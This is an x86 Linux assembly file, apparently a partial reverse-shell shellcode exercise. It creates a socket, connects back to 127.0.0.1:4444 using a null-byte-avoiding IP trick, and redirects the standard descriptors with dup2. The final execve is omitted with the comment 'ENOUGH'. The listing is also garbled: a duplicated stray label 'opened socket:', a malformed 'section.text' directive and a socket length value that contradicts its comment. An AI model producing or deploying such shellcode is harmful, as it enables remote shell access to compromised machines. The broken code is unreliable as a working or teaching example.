global _start

section.text
_start:

	;socket()
	xor ecx, ecx ;xoring ECX
	xor ebx, ebx ;xoring EBX
	mul ebx      ;xoring EAX and EDX
	inc cl  ;ECX should be 1
	inc bl
	inc bl ;EBX should be 2
	mov ax, 0x167
	int 0x80 ;call socket()
	
	;connect
	xchg ebx, eax ;From EAX to EBX ready for the next system calls
	
	;push sockaddr structure in the stack
	dec cl
	push ecx  ;unused char(0)
	
	;move the length(16 bytes) of ip in EDX
	mov dl, 0x16
	
	;the ip is 1.0.0.127 couldbe 4.3.3.130 to avoid NULL bytes
	mov ecx, 0x04030382  ; mov ip in ecx
	sub ecx,  0x03030303 ;subtract 3.3.3.3 from ip
	push ecx  ;load the real ip in the stack
	push word 0x5c11 ;port 4444
	push word 0x02   ;AF_INET family
	lea  ecx, [esp]
						;EBX still contain the value of the opened socket
opened socket:
	mov ax, 0x16a
	int 0x80
	;dup()
	xor ecx, ecx
	mov cl, 0x3
	
	dup2:
		xor eax, eax
					;EBX will still contain the value of the opened socket

opened socket:
	mov al, 0x3f
	dec cl
	int 0x80
	jnz dup2
	
	;execve() from the previous stuff
	
	;ENOUGH
					
	
	
	
	